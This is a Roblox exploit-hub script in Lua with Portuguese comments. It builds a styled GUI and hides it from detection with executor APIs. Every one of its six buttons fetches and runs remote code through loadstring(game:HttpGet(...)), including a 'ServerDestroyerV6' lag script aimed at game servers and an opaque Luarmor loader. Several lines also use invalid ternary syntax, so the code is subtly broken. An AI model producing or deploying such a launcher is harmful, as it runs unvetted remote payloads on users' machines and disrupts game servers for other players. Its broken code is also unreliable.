-- Apple Hub
-- Script com estilo maçã, emojis animados, sombra, arrastável e botões de controle
-- TOTALMENTE RESPONSIVO PARA PC E CELULAR

local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local GuiService = game:GetService("GuiService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Detectar dispositivo
local isMobile = UserInputService.TouchEnabled
local isDesktop = UserInputService.MouseEnabled
local screenSize = workspace.CurrentCamera.ViewportSize

-- Configurações responsivas
local DRAG_SPEED = 0.25
local EMOJI_ANIMATION_SPEED = 2
local MAXIMIZED_SIZE = isMobile and UDim2.new(0.8, 0, 0.7, 0) or UDim2.new(0, 400, 0, 710)
local MINIMIZED_SIZE = isMobile and UDim2.new(0.4, 0, 0, 70) or UDim2.new(0, 200, 0, 60)
local BUTTON_HEIGHT = isMobile and 70 or 60
local ICON_SIZE = isMobile and 50 or 40
local FONT_SIZE_TITLE = isMobile and 24 or 20
local FONT_SIZE_BUTTON = isMobile and 20 or 18
local FONT_SIZE_ICON = isMobile and 28 or 24

-- Cria a interface principal
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AppleHub"
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

-- Proteger a GUI
if gethui then
    ScreenGui.Parent = gethui()
elseif syn and syn.protect_gui then
    syn.protect_gui(ScreenGui)
    ScreenGui.Parent = game:GetService("CoreGui")
elseif game:GetService("CoreGui"):FindFirstChild("RobloxGui") then
    ScreenGui.Parent = game:GetService("CoreGui")
else
    ScreenGui.Parent = player:WaitForChild("PlayerGui")
end

-- Frame principal (maçã)
local MainFrame = Instance.new("Frame")
MainFrame.Name = "AppleFrame"
MainFrame.Size = MAXIMIZED_SIZE
MainFrame.Position = isMobile and UDim2.new(0.1, 0, 0.15, 0) or UDim2.new(0.5, -200, 0.5, -355)
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 59, 48) -- Vermelho maçã
MainFrame.BackgroundTransparency = 0.1
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Active = true
MainFrame.Selectable = true

-- Sombra responsiva
local Shadow = Instance.new("ImageLabel")
Shadow.Name = "Shadow"
Shadow.Size = UDim2.new(1, isMobile and 30 or 20, 1, isMobile and 30 or 20)
Shadow.Position = UDim2.new(0, isMobile and -15 or -10, 0, isMobile and -15 or -10)
Shadow.BackgroundTransparency = 1
Shadow.Image = "rbxassetid://1316045217"
Shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
Shadow.ImageTransparency = 0.7
Shadow.ScaleType = Enum.ScaleType.Slice
Shadow.SliceCenter = Rect.new(10, 10, 118, 118)
Shadow.ZIndex = 0

-- Título com emoji animado
local TitleFrame = Instance.new("Frame")
TitleFrame.Name = "TitleBar"
TitleFrame.Size = UDim2.new(1, 0, 0, isMobile and 50 or 40)
TitleFrame.BackgroundColor3 = Color3.fromRGB(200, 40, 30)
TitleFrame.BackgroundTransparency = 0.2
TitleFrame.BorderSizePixel = 0
TitleFrame.Active = true

-- Emoji animado
local EmojiLabel = Instance.new("TextLabel")
EmojiLabel.Name = "AppleEmoji"
EmojiLabel.Size = UDim2.new(0, isMobile and 50 or 40, 0, isMobile and 50 or 40)
EmojiLabel.Position = UDim2.new(0, isMobile and 15 or 10, 0, 0)
EmojiLabel.BackgroundTransparency = 1
EmojiLabel.Text = "🍎"
EmojiLabel.TextSize = isMobile and 32 or 28
EmojiLabel.Font = Enum.Font.GothamBold
EmojiLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

-- Título
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "Title"
TitleLabel.Size = UDim2.new(1, isMobile and -120 or -100, 1, 0)
TitleLabel.Position = UDim2.new(0, isMobile and 70 or 50, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "Apple Hub " .. (isMobile and "📱" or "🖥️")
TitleLabel.TextSize = FONT_SIZE_TITLE
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left

-- Botões de controle
local ControlFrame = Instance.new("Frame")
ControlFrame.Name = "Controls"
ControlFrame.Size = UDim2.new(0, isMobile and 100 or 80, 0, isMobile and 50 or 40)
ControlFrame.Position = UDim2.new(1, isMobile and -105 or -90, 0, 0)
ControlFrame.BackgroundTransparency = 1

-- Botão minimizar/maximizar
local ToggleSizeButton = Instance.new("TextButton")
ToggleSizeButton.Name = "ToggleSize"
ToggleSizeButton.Size = UDim2.new(0, isMobile and 40 or 30, 0, isMobile and 40 or 30)
ToggleSizeButton.Position = UDim2.new(0, 5, 0, 5)
ToggleSizeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ToggleSizeButton.BackgroundTransparency = 0.8
ToggleSizeButton.Text = "🗖"
ToggleSizeButton.TextSize = isMobile and 22 or 18
ToggleSizeButton.Font = Enum.Font.Gotham
ToggleSizeButton.TextColor3 = Color3.fromRGB(0, 0, 0)
ToggleSizeButton.AutoButtonColor = false
ToggleSizeButton.Active = true
ToggleSizeButton.Selectable = true

-- Botão fechar
local CloseButton = Instance.new("TextButton")
CloseButton.Name = "Close"
CloseButton.Size = UDim2.new(0, isMobile and 40 or 30, 0, isMobile and 40 or 30)
CloseButton.Position = UDim2.new(0, isMobile and 55 or 45, 0, 5)
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.BackgroundTransparency = 0.8
CloseButton.Text = "✕"
CloseButton.TextSize = isMobile and 22 or 18
CloseButton.Font = Enum.Font.Gotham
CloseButton.TextColor3 = Color3.fromRGB(0, 0, 0)
CloseButton.AutoButtonColor = false
CloseButton.Active = true
CloseButton.Selectable = true

-- Conteúdo principal
local ContentFrame = Instance.new("Frame")
ContentFrame.Name = "Content"
ContentFrame.Size = UDim2.new(1, isMobile and -30 or -20, 1, -(isMobile and 70 or 60))
ContentFrame.Position = UDim2.new(0, isMobile and 15 or 10, 0, isMobile and 60 or 50)
ContentFrame.BackgroundTransparency = 1

-- Título da seção Scripts
local ScriptsTitle = Instance.new("TextLabel")
ScriptsTitle.Name = "ScriptsTitle"
ScriptsTitle.Size = UDim2.new(1, 0, 0, isMobile and 50 or 40)
ScriptsTitle.BackgroundTransparency = 1
ScriptsTitle.Text = "📜 Scripts"
ScriptsTitle.TextSize = isMobile and 26 or 22
ScriptsTitle.Font = Enum.Font.GothamBold
ScriptsTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
ScriptsTitle.TextXAlignment = Enum.TextXAlignment.Left

-- Container dos scripts
local ScriptsContainer = Instance.new("ScrollingFrame")
ScriptsContainer.Name = "ScriptsContainer"
ScriptsContainer.Size = UDim2.new(1, 0, 1, -(isMobile and 60 or 50))
ScriptsContainer.Position = UDim2.new(0, 0, 0, isMobile and 50 or 40)
ScriptsContainer.BackgroundTransparency = 1
ScriptsContainer.BorderSizePixel = 0
ScriptsContainer.ScrollBarThickness = isMobile and 8 or 5
ScriptsContainer.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
ScriptsContainer.CanvasSize = UDim2.new(0, 0, 0, 430)
ScriptsContainer.ScrollingDirection = Enum.ScrollingDirection.Y
ScriptsContainer.VerticalScrollBarInset = Enum.ScrollBarInset.Always

-- Layout dos scripts
local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0, isMobile and 12 or 10)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

-- Função para criar botões responsivos
local function createScriptButton(name, displayName, icon, iconColor, isPremium, isDanger)
    local button = Instance.new("TextButton")
    button.Name = name
    button.Size = UDim2.new(0.95, 0, 0, BUTTON_HEIGHT)
    button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    button.BackgroundTransparency = 0.3
    button.Text = ""
    button.AutoButtonColor = false
    button.BorderSizePixel = 0
    button.Active = true
    button.Selectable = true
    
    local iconLabel = Instance.new("TextLabel")
    iconLabel.Name = "Icon"
    iconLabel.Size = UDim2.new(0, ICON_SIZE, 0, ICON_SIZE)
    iconLabel.Position = UDim2.new(0, isMobile and 10 or 5, 0.5, -ICON_SIZE/2)
    iconLabel.BackgroundTransparency = 1
    iconLabel.Text = icon
    iconLabel.TextSize = FONT_SIZE_ICON
    iconLabel.Font = Enum.Font.GothamBold
    iconLabel.TextColor3 = iconColor
    iconLabel.Parent = button
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Name = "Label"
    textLabel.Size = UDim2.new(1, -(ICON_SIZE + (isMobile and 20 or 10)), 1, 0)
    textLabel.Position = UDim2.new(0, ICON_SIZE + (isMobile and 15 or 10), 0, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = displayName
    textLabel.TextSize = FONT_SIZE_BUTTON
    textLabel.Font = Enum.Font.GothamBold
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.TextXAlignment = Enum.TextXAlignment.Left
    textLabel.Parent = button
    
    -- Badge para scripts especiais
    if isPremium or isDanger then
        local badge = Instance.new("TextLabel")
        badge.Name = "Badge"
        badge.Size = UDim2.new(0, isMobile and 30 or 25, 0, isMobile and 30 or 25)
        badge.Position = UDim2.new(1, isMobile and -35 or -30, 0, isMobile and 5 or 5)
        badge.BackgroundColor3 = isPremium and Color3.fromRGB(255, 215, 0) or Color3.fromRGB(178, 34, 34)
        badge.BackgroundTransparency = 0.2
        badge.Text = isPremium and "⚡" or "💀"
        badge.TextSize = isMobile and 16 or 14
        badge.Font = Enum.Font.GothamBold
        badge.TextColor3 = isPremium and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)
        badge.Parent = button
        
        local badgeCorner = Instance.new("UICorner")
        badgeCorner.CornerRadius = UDim.new(0, isMobile and 15 or 12)
        badgeCorner.Parent = badge
    end
    
    return button, iconLabel, textLabel
end

-- Criar botões responsivos
local NamelessButton, NamelessIcon, NamelessLabel = createScriptButton(
    "NamelessHub", 
    "Nameless Hub [OP]", 
    "👑", 
    Color3.fromRGB(255, 215, 0),
    false,
    false
)

local ChilliButton, ChilliIcon, ChilliLabel = createScriptButton(
    "ChilliHub", 
    "Chilli Hub [OP]", 
    "🌶️", 
    Color3.fromRGB(255, 69, 58),
    false,
    false
)

local UCTButton, UCTIcon, UCTLabel = createScriptButton(
    "UCTHub", 
    "UCT HUB [OP]", 
    "⚡", 
    Color3.fromRGB(0, 191, 255),
    false,
    false
)

local KurdButton, KurdIcon, KurdLabel = createScriptButton(
    "KurdHub", 
    "Kurd Hub [OP]", 
    "🏔️", 
    Color3.fromRGB(34, 139, 34),
    false,
    false
)

local LagAuraButton, LagAuraIcon, LagAuraLabel = createScriptButton(
    "LagAura", 
    "Lag+Aura [OP]", 
    "💀", 
    Color3.fromRGB(178, 34, 34),
    false,
    true
)

local AdminSpamButton, AdminSpamIcon, AdminSpamLabel = createScriptButton(
    "AdminSpam", 
    "Admin Panel Spam [OP+]", 
    "👑", 
    Color3.fromRGB(255, 215, 0),
    true,
    false
)

-- Montagem da interface
Shadow.Parent = MainFrame
MainFrame.Parent = ScreenGui
TitleFrame.Parent = MainFrame
EmojiLabel.Parent = TitleFrame
TitleLabel.Parent = TitleFrame
ControlFrame.Parent = TitleFrame
ToggleSizeButton.Parent = ControlFrame
CloseButton.Parent = ControlFrame
ContentFrame.Parent = MainFrame
ScriptsTitle.Parent = ContentFrame
ScriptsContainer.Parent = ContentFrame
UIListLayout.Parent = ScriptsContainer

-- Adicionar botões ao container
NamelessButton.Parent = ScriptsContainer
ChilliButton.Parent = ScriptsContainer
UCTButton.Parent = ScriptsContainer
KurdButton.Parent = ScriptsContainer
LagAuraButton.Parent = ScriptsContainer
AdminSpamButton.Parent = ScriptsContainer

-- Variáveis de estado
local isDragging = false
local dragInput, dragStart, startPos
local isMinimized = false
local originalSize = MAXIMIZED_SIZE
local originalPosition = MainFrame.Position
local emojiRotation = 0

-- Sistema de input para mobile e PC
local function getInputPosition(input)
    if input.UserInputType == Enum.UserInputType.Touch then
        return input.Position
    elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
        return input.Position
    end
    return nil
end

-- Função para animar o emoji
local function animateEmoji()
    emojiRotation = (emojiRotation + EMOJI_ANIMATION_SPEED * RunService.RenderStepped:Wait()) % 360
    
    local scale = 1 + math.sin(os.clock() * 3) * 0.1
    EmojiLabel.Rotation = emojiRotation
    EmojiLabel.Size = UDim2.new(0, (isMobile and 50 or 40) * scale, 0, (isMobile and 50 or 40) * scale)
    EmojiLabel.Position = UDim2.new(
        0, (isMobile and 15 or 10) - (scale - 1) * (isMobile and 25 or 20), 
        0, -(scale - 1) * (isMobile and 25 or 20)
    )
end

-- Função de clique suave adaptada para mobile
local function animateClick(button)
    local originalSize = button.Size
    local originalTransparency = button.BackgroundTransparency
    
    local tweenIn = TweenService:Create(button, TweenInfo.new(0.1), {
        Size = UDim2.new(
            originalSize.X.Scale, 
            originalSize.X.Offset * (isMobile and 0.92 : 0.95),
            originalSize.Y.Scale, 
            originalSize.Y.Offset * (isMobile and 0.92 : 0.95)
        ),
        BackgroundTransparency = originalTransparency - 0.15
    })
    
    local tweenOut = TweenService:Create(button, TweenInfo.new(0.1), {
        Size = originalSize,
        BackgroundTransparency = originalTransparency
    })
    
    tweenIn:Play()
    if not isMobile then
        tweenIn.Completed:Wait()
    end
    task.wait(0.05)
    tweenOut:Play()
end

-- Sistema de arrastar para mobile e PC
local function updateDrag(input)
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(
        startPos.X.Scale, 
        startPos.X.Offset + delta.X,
        startPos.Y.Scale, 
        startPos.Y.Offset + delta.Y
    )
end

-- Configurar arrastar para mobile e PC
local function setupDragging(frame)
    frame.InputBegan:Connect(function(input)
        local position = getInputPosition(input)
        if position then
            isDragging = true
            dragStart = position
            startPos = MainFrame.Position
            
            -- Feedback visual para mobile
            if isMobile then
                frame.BackgroundTransparency = 0.05
            end
            
            -- Conectar evento de fim
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    isDragging = false
                    if isMobile then
                        frame.BackgroundTransparency = 0.2
                    end
                end
            end)
        end
    end)
    
    frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch or 
           input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)
end

-- Configurar arrastar
setupDragging(TitleFrame)

-- Atualizar posição durante arrasto
UserInputService.InputChanged:Connect(function(input)
    if isDragging and dragInput and input == dragInput then
        updateDrag(input)
    end
end)

-- Funções dos botões de controle
ToggleSizeButton.MouseButton1Click:Connect(function()
    if isMobile then
        ToggleSizeButton.TouchTap:Connect(function()
            animateClick(ToggleSizeButton)
        end)
    end
    
    animateClick(ToggleSizeButton)
    
    if isMinimized then
        -- Maximizar
        MainFrame:TweenSize(MAXIMIZED_SIZE, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true)
        ContentFrame.Visible = true
        ToggleSizeButton.Text = "🗖"
        isMinimized = false
    else
        -- Minimizar
        MainFrame:TweenSize(MINIMIZED_SIZE, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true)
        ContentFrame.Visible = false
        ToggleSizeButton.Text = "🗗"
        isMinimized = true
    end
end)

CloseButton.MouseButton1Click:Connect(function()
    if isMobile then
        CloseButton.TouchTap:Connect(function()
            animateClick(CloseButton)
        end)
    end
    
    animateClick(CloseButton)
    ScreenGui:Destroy()
end)

-- Configurar botões para mobile (TouchTap)
local function setupMobileTap(button, callback)
    if isMobile then
        button.TouchTap:Connect(function()
            callback()
        end)
    end
end

-- Funções dos scripts (com suporte a mobile)
local function executeScript(button, icon, label, originalText, originalIcon, scriptFunc)
    -- Configurar tap mobile
    if isMobile then
        button.TouchTap:Connect(function()
            animateClick(button)
            scriptFunc()
        end)
    end
    
    -- Configurar clique PC
    button.MouseButton1Click:Connect(function()
        animateClick(button)
        scriptFunc()
    end)
end

-- Configurar todos os scripts
executeScript(NamelessButton, NamelessIcon, NamelessLabel, "Nameless Hub [OP]", "👑", function()
    NamelessIcon.Text = "⏳"
    NamelessLabel.Text = "Executando..."
    
    task.wait(0.5)
    
    local success, error = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr"))()
    end)
    
    if success then
        NamelessIcon.Text = "✅"
        NamelessLabel.Text = "Nameless Hub [EXECUTADO]"
    else
        NamelessIcon.Text = "❌"
        NamelessLabel.Text = "Nameless Hub [ERRO]"
    end
    
    task.wait(1)
    NamelessIcon.Text = "👑"
    NamelessLabel.Text = "Nameless Hub [OP]"
end)

executeScript(ChilliButton, ChilliIcon, ChilliLabel, "Chilli Hub [OP]", "🌶️", function()
    ChilliIcon.Text = "⏳"
    ChilliLabel.Text = "Executando..."
    
    task.wait(0.5)
    
    local success, error = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()
    end)
    
    if success then
        ChilliIcon.Text = "✅"
        ChilliLabel.Text = "Chilli Hub [EXECUTADO]"
    else
        ChilliIcon.Text = "❌"
        ChilliLabel.Text = "Chilli Hub [ERRO]"
    end
    
    task.wait(1)
    ChilliIcon.Text = "🌶️"
    ChilliLabel.Text = "Chilli Hub [OP]"
end)

executeScript(UCTButton, UCTIcon, UCTLabel, "UCT HUB [OP]", "⚡", function()
    UCTIcon.Text = "⏳"
    UCTLabel.Text = "Executando..."
    
    task.wait(0.5)
    
    local success, error = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/UCT-hub/main/refs/heads/main/stealabrainrot"))()
    end)
    
    if success then
        UCTIcon.Text = "✅"
        UCTLabel.Text = "UCT HUB [EXECUTADO]"
    else
        UCTIcon.Text = "❌"
        UCTLabel.Text = "UCT HUB [ERRO]"
    end
    
    task.wait(1)
    UCTIcon.Text = "⚡"
    UCTLabel.Text = "UCT HUB [OP]"
end)

executeScript(KurdButton, KurdIcon, KurdLabel, "Kurd Hub [OP]", "🏔️", function()
    KurdIcon.Text = "⏳"
    KurdLabel.Text = "Executando..."
    
    task.wait(0.5)
    
    local success, error = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Ninja10908/S4/refs/heads/main/Kurdhub"))()
    end)
    
    if success then
        KurdIcon.Text = "✅"
        KurdLabel.Text = "Kurd Hub [EXECUTADO]"
    else
        KurdIcon.Text = "❌"
        KurdLabel.Text = "Kurd Hub [ERRO]"
    end
    
    task.wait(1)
    KurdIcon.Text = "🏔️"
    KurdLabel.Text = "Kurd Hub [OP]"
end)

executeScript(LagAuraButton, LagAuraIcon, LagAuraLabel, "Lag+Aura [OP]", "💀", function()
    LagAuraIcon.Text = "⏳"
    LagAuraLabel.Text = "Configurando..."
    
    task.wait(0.3)
    
    local success, error = pcall(function()
        getgenv().ServerDestroyerV6 = {
            Comprar = false,
            Spam = true
        }
        
        LagAuraIcon.Text = "⚙️"
        LagAuraLabel.Text = "Executando..."
        
        task.wait(0.2)
        
        loadstring(game:HttpGet("https://tcscripts.discloud.app/scripts/serverdestroyerv6"))()
    end)
    
    if success then
        LagAuraIcon.Text = "✅"
        LagAuraLabel.Text = "Lag+Aura [ATIVADO]"
        
        local originalColor = LagAuraButton.BackgroundColor3
        local dangerEffect = RunService.Heartbeat:Connect(function()
            local pulse = math.sin(os.clock() * 5) * 0.3 + 0.7
            LagAuraButton.BackgroundColor3 = Color3.new(
                originalColor.R * pulse,
                originalColor.G * 0.3,
                originalColor.B * 0.3
            )
        end)
        
        task.wait(3)
        dangerEffect:Disconnect()
        LagAuraButton.BackgroundColor3 = originalColor
        
    else
        LagAuraIcon.Text = "❌"
        LagAuraLabel.Text = "Lag+Aura [ERRO]"
    end
    
    task.wait(1)
    LagAuraIcon.Text = "💀"
    LagAuraLabel.Text = "Lag+Aura [OP]"
end)

executeScript(AdminSpamButton, AdminSpamIcon, AdminSpamLabel, "Admin Panel Spam [OP+]", "👑", function()
    AdminSpamIcon.Text = "✨"
    AdminSpamLabel.Text = "Iniciando Admin Panel..."
    
    local originalColor = AdminSpamButton.BackgroundColor3
    local glowEffect = RunService.Heartbeat:Connect(function()
        local glow = math.sin(os.clock() * 8) * 0.2 + 0.8
        AdminSpamButton.BackgroundColor3 = Color3.new(
            math.min(originalColor.R * glow + 0.1, 1),
            math.min(originalColor.G * glow + 0.05, 1),
            math.min(originalColor.B * glow, 1)
        )
    end)
    
    task.wait(0.5)
    
    local success, error = pcall(function()
        AdminSpamIcon.Text = "🔄"
        AdminSpamLabel.Text = "Carregando Luarmor..."
        
        task.wait(0.3)
        
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fc9523e876bada3b7ed4ebe004cb8cf9.lua"))()
    end)
    
    if success then
        AdminSpamIcon.Text = "👑"
        AdminSpamLabel.Text = "Admin Panel [ATIVADO]"
        
        local crownGlow = RunService.Heartbeat:Connect(function()
            local pulse = math.sin(os.clock() * 6) * 0.3 + 0.7
            AdminSpamIcon.TextColor3 = Color3.new(
                1,
                0.843 + pulse * 0.15,
                0
            )
        end)
        
        task.wait(5)
        crownGlow:Disconnect()
        
    else
        AdminSpamIcon.Text = "❌"
        AdminSpamLabel.Text = "Admin Panel [ERRO]"
    end
    
    glowEffect:Disconnect()
    AdminSpamButton.BackgroundColor3 = originalColor
    
    task.wait(1)
    AdminSpamIcon.Text = "👑"
    AdminSpamIcon.TextColor3 = Color3.fromRGB(255, 215, 0)
    AdminSpamLabel.Text = "Admin Panel Spam [OP+]"
end)

-- Efeitos hover (apenas para PC)
if not isMobile then
    local function setupHoverEffects(button, icon, label, originalIcon)
        button.MouseEnter:Connect(function()
            button.BackgroundTransparency = 0.1
            label.TextColor3 = Color3.fromRGB(255, 215, 0)
            
            if button.Name == "LagAura" then
                local shakeX = math.random(-2, 2)
                local shakeY = math.random(-2, 2)
                icon.Position = UDim2.new(0, 5 + shakeX, 0.5, -20 + shakeY)
            end
            
            if button.Name == "AdminSpam" then
                icon.Text = "✨"
                icon.Rotation = math.sin(os.clock() * 10) * 5
            end
        end)
        
        button.MouseLeave:Connect(function()
            button.BackgroundTransparency = 0.3
            label.TextColor3 = Color3.fromRGB(255, 255, 255)
            
            if button.Name == "LagAura" then
                icon.Position = UDim2.new(0, 5, 0.5, -20)
            end
            
            if button.Name == "AdminSpam" then
                icon.Text = originalIcon
                icon.Rotation = 0
            end
        end)
    end
    
    setupHoverEffects(NamelessButton, NamelessIcon, NamelessLabel, "👑")
    setupHoverEffects(ChilliButton, ChilliIcon, ChilliLabel, "🌶️")
    setupHoverEffects(UCTButton, UCTIcon, UCTLabel, "⚡")
    setupHoverEffects(KurdButton, KurdIcon, KurdLabel, "🏔️")
    setupHoverEffects(LagAuraButton, LagAuraIcon, LagAuraLabel, "💀")
    setupHoverEffects(AdminSpamButton, AdminSpamIcon, AdminSpamLabel, "👑")
end

-- Animação contínua do emoji
RunService.RenderStepped:Connect(animateEmoji)

-- Ajustar interface quando a tela mudar de tamanho
screenSize:GetPropertyChangedSignal("X"):Connect(function()
    if not isMinimized then
        MainFrame.Size = isMobile and UDim2.new(0.8, 0, 0.7, 0) or UDim2.new(0, 400, 0, 710)
    end
end)

-- Inicialização
print("🍎 Apple Hub carregado com sucesso!")
print("📱 Dispositivo: " .. (isMobile and "Celular" or "PC"))
print("📜 Scripts disponíveis:")
print("1. 👑 Nameless Hub [OP]")
print("2. 🌶️ Chilli Hub [OP]")
print("3. ⚡ UCT HUB [OP]")
print("4. 🏔️ Kurd Hub [OP]")
print("5. 💀 Lag+Aura [OP]")
print("6. 👑 Admin Panel Spam [OP+]")

-- Adiciona borda arredondada
local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, isMobile and 20 : 15)
Corner.Parent = MainFrame

local ButtonCorner = Instance.new("UICorner")
ButtonCorner.CornerRadius = UDim.new(0, isMobile and 15 : 10)

-- Aplicar cantos arredondados a todos os botões
for _, button in pairs({
    NamelessButton, ChilliButton, UCTButton, 
    KurdButton, LagAuraButton, AdminSpamButton,
    ToggleSizeButton, CloseButton
}) do
    local corner = ButtonCorner:Clone()
    corner.Parent = button
end

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, isMobile and 20 : 15)
TitleCorner.Parent = TitleFrame

-- Ajusta o tamanho do canvas dinamicamente
UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    ScriptsContainer.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 20)
end)

-- Efeito de gradiente para os botões
local function addButtonEffect(button)
    local Gradient = Instance.new("UIGradient")
    Gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 40)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 20))
    }
    Gradient.Rotation = 90
    Gradient.Parent = button
    
    local Stroke = Instance.new("UIStroke")
    Stroke.Color = Color3.fromRGB(100, 100, 100)
    Stroke.Thickness = 1
    Stroke.Transparency = 0.7
    Stroke.Parent = button
end

-- Aplica efeitos aos botões
for _, button in pairs({
    NamelessButton, ChilliButton, UCTButton, 
    KurdButton, LagAuraButton, AdminSpamButton
}) do
    addButtonEffect(button)
end

-- Efeitos especiais para mobile (vibração leve)
if isMobile then
    local function addMobileVibration(button)
        button.TouchTap:Connect(function()
            -- Simular vibração leve (feedback tátil)
            if game:GetService("VibrationService") then
                pcall(function()
                    game:GetService("VibrationService"):Vibrate(0.1)
                end)
            end
        end)
    end
    
    addMobileVibration(NamelessButton)
    addMobileVibration(ChilliButton)
    addMobileVibration(UCTButton)
    addMobileVibration(KurdButton)
    addMobileVibration(LagAuraButton)
    addMobileVibration(AdminSpamButton)
    addMobileVibration(ToggleSizeButton)
    addMobileVibration(CloseButton)
end

-- Ajustar posição inicial para mobile (evitar sobreposição com controles)
if isMobile then
    task.wait(0.1)
    local safeArea = GuiService:GetGuiInset()
    MainFrame.Position = UDim2.new(
        0.1, 
        safeArea.X,
        0.15, 
        safeArea.Y
    )
end

-- Ajustar tamanho inicial do canvas
task.wait(0.2)
ScriptsContainer.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y + 20)

-- Feedback de carregamento completo
print("✅ Interface totalmente responsiva carregada!")
print("📏 Tamanho da tela: " .. screenSize.X .. "x" .. screenSize.Y)
print("🎮 Controles: " .. (isMobile and "Toque/Touch" or "Mouse/Teclado"))
